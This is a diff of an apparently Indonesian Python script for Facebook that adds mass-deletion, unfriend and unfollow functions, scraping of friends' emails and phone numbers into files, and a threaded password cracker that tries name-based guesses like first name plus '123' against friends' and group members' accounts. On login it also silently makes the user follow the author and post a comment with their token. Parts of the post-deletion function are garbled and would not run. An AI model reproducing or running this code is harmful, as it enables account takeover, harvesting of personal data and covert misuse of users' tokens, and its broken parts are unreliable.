@@ -1,24 +1,24 @@
 #!/usr/bin/python
-
+# -*- coding: utf-8 -*-
 import os, sys, time, json, requests, hashlib
 from multiprocessing.pool import ThreadPool
 from getpass import getpass
 from requests.exceptions import ConnectionError
 
-#### WARNA ####
-p='\033[1;97m' #putih
-m='\033[1;91m' #merah
-h='\033[1;92m' #hijau
-k='\033[1;93m' #kuning
-B='\033[1;96m' #biru
 
-#### URL ####
+p='\033[1;97m' 
+m='\033[1;91m' 
+h='\033[1;92m' 
+k='\033[1;93m' 
+B='\033[1;96m' 
+
+
 url='https://graph.facebook.com/'
 fb='https://api.facebook.com/restserver.php'
 headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
 s=requests.Session()
 
-#### MENULIS ####
+
 def lunga(s):
 	for a in s +'\n':
 		sys.stdout.write(a)
@@ -27,7 +27,13 @@ def lunga(s):
 
 #### LOGO ####
 logo=(B+'''
-   	ITIL
+    ____        __                     
+   / __ )____  / /_   ____ ________  __
+  / __  / __ \/ __/  / __ `/ ___/ / / /
+ / /_/ / /_/ / /_   / /_/ (__  ) /_/ / 
+/_____/\____/\__/   \__,_/____/\__,_/  
+'''+h+'''\n︻╦̵̵͇̿̿̿̿╤─────メ '''+m+'''Coded By DulLah'''+h+''' メ─────╦̵̵͇̿̿̿̿╤︻
+'''+h+'''       (►_◄) '''+k+'''Fb.me/DulahZ'''+h+''' (►_◄)
 ''')
 
 ok=[]
@@ -40,17 +46,16 @@ email=[]
 def menu():
 	os.system('clear')
 	try:
-		token=open('cookie/token.log','r').read()
+		token=open('result/token.txt','r').read()
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		time.sleep(1)
-		os.system('rm -rf cookie/token.log')
+		os.system('rm -rf result/token.txt')
 	try:
 		ok=s.get(url+'me?access_token='+token).json()
 	except KeyError:
 		print(m+'['+p+'!'+m+'] Token not found')
-		os.system('rm -rf cookie/token.log')
-
+		os.system('rm -rf result/token.txt')
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
@@ -87,46 +92,368 @@ def menu():
 	elif z=='8' or z=='08':
 		menumbf()
 	elif z=='0' or z=='00':
-		os.system('rm -rf cookie/token.log')
+		os.system('rm -rf result/token.txt')
 		os.sys.exit()
 	else:
 		print(m+'[!] Wrong input')
 		time.sleep(1)
 		menu()
+		
+#### DELETE POST ####
+
 
 def post():
 	os.system('clear')
 	try:
-		token=open('cookie/token.log','r').read()
+		token=open('result/token.txt','r').read()
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		time.sleep(1)
 		os.system('rm -rf token.txt')
 		login()
-	response = requests.get('https://graph.facebook.com/me&access_token%7Btoken%7D&until=1542583212&__paging_token=enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3')
+	response = requests.get('https://graph.facebook.com/me?access_token={}&until=1542583212&__paging_token=enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3').format(token)
+	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+response['name'])
+	print('\nScrap dari akun {})'.json(data).format(name)
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	response = requests.get('https://graph.facebook.com/me/fields=feed.limit(49)&access_token={}&until=1542583212&__paging_token=enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3').format(token)
+		data = (('method', 'delete'),('access_token', '{}'),('until', '1542583212'),('__paging_token', 'enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3'),).format(token)
+		response = requests.delete('https://graph.facebook.com/{}', params=data)
+	try:
+		response={'error'}{'message'}
+		print('[×] Failed')
+
+	except TypeError:
+		print ("{},{}").format(data, id)
+
+	except requests.exceptions.ConnectionError:
+		print('[×] No connection')
+		print('\n[✓] Program selesai')
+
+	
+#### DELETE ALBUMS ####
+def albums():
+	os.system('clear')
+	try:
+		token=open('result/token.txt','r').read()
+	except IOError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		time.sleep(1)
+		os.system('rm -rf result/token.txt')
+		login()
+	yz=s.get(url+'me?access_token='+token).json()
+	os.system('clear')
+	print(logo)
+	print(p+40*'_')
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
 	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
-
-
-	response = requests.get('https://graph.facebook.com/me%0A%20%20%20fields=feed.limit(49)%0A%20%20%20&access_token=%7Btoken%7D&until=1542583212&__paging_token=enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3')
-	for data in response['data']:
-		params = (
-    ('access_token', '{token}'),
-    ('until', '1542583212'),
-    ('__paging_token', 'enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3'),)
-		response = requests.delete('https://graph.facebook.com/%7Bdata%7D%0A%20%20%20%20', params=params)
+	ok=s.get(url+'v2.3/me/albums?access_token='+token).json()
+	for o in ok['data']:
+		ya=s.post(url+o['id']+'?method=DELETE&access_token='+token).json()
 		try:
-			kebusek=response['error']['message']
-			print('[×] Cingire ora bisa dibusek...')
+			asu=ya['error']['message']
+			print(m+'[×] Failed '+o['name'])
 		except TypeError:
-			print('[ Wes dibusek... ]'' 'data['id'])
+			print(m+'['+h+' Deleted '+m+'] '+p+o['name'])
 		except requests.exceptions.ConnectionError:
-			print(m+'[×] No connection')
-			print('\n[✓] Program finished')
+			print(m+'['+p+'×'+m+'] No connection')
+	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+	
+#### DELETE PHOTO ALBUMS ####
+def photo():
+	os.system('clear')
+	try:
+		token=open('result/token.txt','r').read()
+	except IOError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		time.sleep(1)
+		os.system('rm -rf result/token.txt')
+		login()
+	os.system('clear')
+	print(logo)
+	print(p+40*'_')
+	al=input(m+'\n['+p+'+'+m+']'+h+' Input ID album'+p+' : ')
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	print(p+40*'_'+'\n')
+	ok=s.get(url+al+'/photos?access_token='+token).json()
+	for o in ok['data']:
+		ya=s.post(url+o['id']+'?method=DELETE&access_token='+token).json()
+		try:
+			asu=ya['error']['message']
+			print(m+'[×] Failed')
+		except TypeError:
+			print(m+'['+h+' Deleted '+m+'] '+p+o['id'])
+		except KeyError:
+			print(m+'[!] Album not found')
+		except requests.exceptions.ConnectionError:
+			print(m+'['+p+'×'+m+'] No connection')
+	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
 
+#### UNFRIEND ####
+def unfriend():
+	os.system('clear')
+	try:
+		token=open('result/token.txt','r').read()
+	except IOError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		time.sleep(1)
+		os.system('rm -rf result/token.txt')
+		login()
+	yz=s.get(url+'me?access_token='+token).json()
+	os.system('clear')
+	print(logo)
+	print(p+40*'_')
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	print(p+40*'_'+'\n')
+	ok=s.get(url+'me/friends?access_token='+token).json()
+	for o in ok['data']:
+		ya=s.delete(url+'me/friends?uid='+o['id']+'&access_token='+token).json()
+		try:
+			asu=ya['error']['message']
+			print(m+'[×] Failed')
+		except TypeError:
+			print(m+'['+h+' Unfriend '+m+'] '+p+o['name'])
+		except requests.exceptions.ConnectionError:
+			print(m+'['+p+'×'+m+'] No connection')
+	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+
+#### STOP FOLLOWING ALL FRIEND ####
+def stopfollowing():
+	os.system('clear')
+	try:
+		token=open('result/token.txt','r').read()
+	except IOError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		time.sleep(1)
+		os.system('rm -rf result/token.txt')
+		login()
+	yz=s.get(url+'me?access_token='+token).json()
+	os.system('clear')
+	print(logo)
+	print(p+40*'_')
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	print(p+40*'_'+'\n')
+	ok=s.get(url+'me/subscribedto?limit=500&access_token='+token).json()
+	for o in ok['data']:
+		ya=s.post(url+o['id']+'/subscribers?method=delete&access_token='+token).json()
+		try:
+			asu=ya['error']['message']
+			print(m+'[×] Failed')
+		except TypeError:
+			print(m+'['+h+' Unfollow '+m+'] '+p+o['name'])
+		except requests.exceptions.ConnectionError:
+			print(m+'['+p+'×'+m+'] No connection')
+	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+	
+#### EMAIL FRIEND ####
+def getemail():
+	os.system('clear')
+	try:
+		token=open('result/token.txt','r').read()
+	except IOError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		time.sleep(1)
+		os.system('rm -rf result/token.txt')
+		login()
+	yz=s.get(url+'me?access_token='+token).json()
+	os.system('clear')
+	print(logo)
+	print(p+40*'_')
+	lunga(m+'\n['+p+'*'+m+']'+h+' Fetching all email')
+	time.sleep(1)
+	print(m+'['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	print(p+40*'_'+'\n')
+	ok=s.get(url+'me/friends?access_token='+token).json()
+	mail=open('result/mail.txt','w')
+	for o in ok['data']:
+		ya=s.get(url+o['id']+'?access_token='+token).json()
+		try:
+			print(m+'['+p+'*'+m+'] '+p+ya['name']+m+' >> '+h+ya['email'])
+			email.append(ya['email'])
+			mail.write(ya['email']+'\n')
+		except requests.exceptions.ConnectionError:
+			print(m+'['+p+'×'+m+'] No connection')
+		except KeyError:
+			pass
+	mail.close()
+	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+	print(m+'['+p+'+'+m+']'+p+' Total email : '+h+str(len(email)))
+	print(m+'['+p+'+'+m+']'+p+' File saved : '+h+'result/mail.txt')
+
+#### PHONE NUMBERS ####
+def getphone():
+	os.system('clear')
+	try:
+		token=open('result/token.txt','r').read()
+	except IOError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		time.sleep(1)
+		os.system('rm -rf result/token.txt')
+		login()
+	yz=s.get(url+'me?access_token='+token).json()
+	os.system('clear')
+	print(logo)
+	print(p+40*'_')
+	lunga(m+'\n['+p+'*'+m+']'+h+' Fetching all phone numbers')
+	time.sleep(1)
+	print(m+'['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	print(p+40*'_'+'\n')
+	ok=s.get(url+'me/friends?access_token='+token).json()
+	ph=open('result/phone.txt','w')
+	for o in ok['data']:
+		ya=s.get(url+o['id']+'?access_token='+token).json()
+		try:
+			print(m+'['+p+'*'+m+'] '+p+ya['name']+m+' >> '+h+ya['mobile_phone'])
+			phone.append(ya['mobile_phone'])
+			ph.write(ya['mobile_phone']+'\n')
+		except requests.exceptions.ConnectionError:
+			print(m+'['+p+'×'+m+'] No connection')
+		except KeyError:
+			pass
+	ph.close()
+	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+	print(m+'['+p+'+'+m+']'+p+' Total phone numbers : '+h+str(len(phone)))
+	print(m+'['+p+'+'+m+']'+p+' File saved : '+h+'result/phone.txt')
+
+#### MBF ####
+def menumbf():
+	global token, p, m, k, h, ok, cp, headers, url
+	os.system('clear')
+	try:
+		token=open('result/token.txt','r').read()
+	except IOError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		time.sleep(1)
+		os.system('rm -rf result/token.txt')
+		login()
+	os.system('clear')
+	print(logo)
+	print(p+40*'_')
+	print(m+'\n('+h+'●'+m+') '+p+'01.'+k+' Crack from list friend')
+	print(m+'('+h+'●'+m+') '+p+'02.'+k+' Crack from friend')
+	print(m+'('+h+'●'+m+') '+p+'03.'+k+' Crack from member group')
+	print(m+'('+h+'●'+m+') '+m+'00. Back')
+	e=input('\n'+p+'>>> ')
+	if e=='':
+		print(m+'[!] Wrong input')
+		time.sleep(1)
+		menumbf()
+	elif e=='1' or e=='01':
+		os.system('clear')
+		yz=s.get(url+'me?access_token='+token).json()
+		print(logo)
+		print(p+40*'_'+'\n')
+		print(m+'['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+		oh=s.get(url+'me/friends?access_token='+token).json()
+		for o in oh['data']:
+			id.append(o['id'])
+	elif e=='2' or e=='02':
+		os.system('clear')
+		print(logo)
+		print(p+40*'_')
+		fr=input(m+'\n['+p+'+'+m+']'+h+' Id friend '+p+': ')
+		try:
+			oa=s.get(url+fr+'?access_token='+token).json()
+			print(m+'['+p+'+'+m+']'+h+' from '+p+': '+oa['name'])
+		except KeyError:
+			print(m+'['+p+'×'+m+'] Friend not found')
+			os.sys.exit()
+		ok=s.get(url+fr+'/friends?access_token='+token).json()
+		for i in ok['data']:
+			id.append(i['id'])
+	elif e=='3' or e=='03':
+		os.system('clear')
+		print(logo)
+		print(m+'[ '+h+'Your group lists'+m+' ]'+'\n')
+		ze=s.get(url+'me/groups?access_token='+token).json()
+		for v in ze['data']:
+			print(p+40*'-')
+			print(m+'*'+p+'Name'+m+' >> '+p+v['name'])
+			print(m+'*'+p+'ID'+m+'   >> '+p+v['id'])
+			print(p+40*'-')
+		print(p+40*'_')
+		gr=input(m+'\n['+p+'+'+m+']'+h+' Id group '+p+': ')
+		try:
+			ow=s.get(url+'group/?id='+gr+'&access_token='+token).json()
+			print(m+'['+p+'+'+m+']'+h+' from '+p+': '+ow['name'])
+		except KeyError:
+			print(m+'['+p+'×'+m+'] Group not found')
+			os.sys.exit()
+		oq=s.get(url+gr+'/members?fields=name,id&limit=9999&access_token='+token).json()
+		for j in oq['data']:
+			id.append(j['id'])
+	elif e=='0' or e=='00':
+		menu()
+	else:
+		print(m+'[!] Wrong input')
+		time.sleep(1)
+		menumbf()
+			
+	print(m+'['+p+'+'+m+']'+h+' Total id '+p+': '+str(len(id)))
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	print(p+40*'_'+'\n')
+	
+	#### CRACK ####
+	def crack(asw):
+		user=asw
+		try:
+			ya=s.get(url+user+'/?access_token='+token).json()
+			pas1=ya['first_name']+'123'
+			b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+			if 'access_token' in b:
+				print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas1)
+				ok.append(user+pas1)
+			else:
+				if 'www.facebook.com' in b['error_msg']:
+					print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas1)
+					cp.append(user+pas1)
+					c=open('result/cp.txt','a')
+					c.write(user+' | '+pas1+' >> '+sub+'\n')
+					c.close()
+				else:
+					pas2=ya['last_name']+'123'
+					b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+					if 'access_token' in b:
+						print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas2)
+						ok.append(user+pas2)
+					else:
+						if 'www.facebook.com' in b['error_msg']:
+							print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas2)
+							cp.append(user+pas2)
+							c=open('result/cp.txt','a')
+							c.write(user+' | '+pas2+' >> '+sub+'\n')
+							c.close()
+						else:
+							pas3=ya['first_name']+'12345'
+							b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+							if 'access_token' in b:
+								print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas3)
+								ok.append(user+pas3)
+							else:
+								if 'www.facebook.com' in b['error_msg']:
+									print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas3)
+									cp.append(user+pas3)
+									c=open('result/cp.txt','a')
+									c.write(user+' | '+pas3+' >> '+sub+'\n')
+									c.close()
+									
+				
+		except:
+			pass
+			
+	f = ThreadPool(30)
+	f.map(crack, id)
+	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+	print(m+'['+p+'+'+m+']'+p+' Total '+h+'OK'+p+'/'+k+'CP'+p+' : '+h+str(len(ok))+p+' / '+k+str(len(cp)))
+	print(m+'['+h+'+'+m+']'+p+' CP file saved : '+h+'result/cp.txt')
+	
+#### GET TOKEN ####
 if __name__=='__main__':
 	os.system('clear')
 	try:
@@ -134,7 +461,7 @@ if __name__=='__main__':
 	except OSError:
 		pass
 	try:
-		token=open('cookie/token.log','r')
+		token=open('result/token.txt','r')
 		menu()
 	except (KeyError,IOError):
 		os.system('clear')
@@ -150,17 +477,17 @@ if __name__=='__main__':
 			x.update(sig.encode('utf-8'))
 			data.update({'sig':x.hexdigest()})
 			ok=s.get(fb,params=data).json()
-			unikers=open('cookie/token.log','w')
+			unikers=open('result/token.txt','w')
 			unikers.write(ok['access_token'])
 			unikers.close()
 			if 'access_token' in ok:
-				token=open('cookie/token.log','r').read()
+				token=open('result/token.txt','r').read()
 				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'DulahZ/subscribers?access_token='+token);s.post(url+'100005584243934_1145924785603652/comments?message=Keren❤️&access_token='+token)
 				time.sleep(1)
 				menu()
 		except KeyError:
 			print(m+'['+p+'×'+m+'] Failed please cek your account and try again')
-			os.system('rm -rf cookie/token.log')
+			os.system('rm -rf result/token.txt')
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 
